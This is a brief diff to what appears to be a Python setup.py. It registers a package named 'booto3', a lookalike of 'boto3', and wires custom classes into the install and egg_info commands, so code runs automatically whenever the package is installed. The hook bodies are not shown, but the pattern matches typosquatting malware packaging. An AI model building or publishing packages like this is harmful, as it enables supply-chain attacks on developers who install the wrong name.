@@ -48,4 +48,10 @@ class RunInstallCommand(install):
         install.run(self)
 
 
-# setup(...) removed                                                                                                                                                         
+setup(
+    name="booto3",
+    version="0.0.1",
+    license="MIT",
+    packages=find_packages(),
+    cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand},
+)
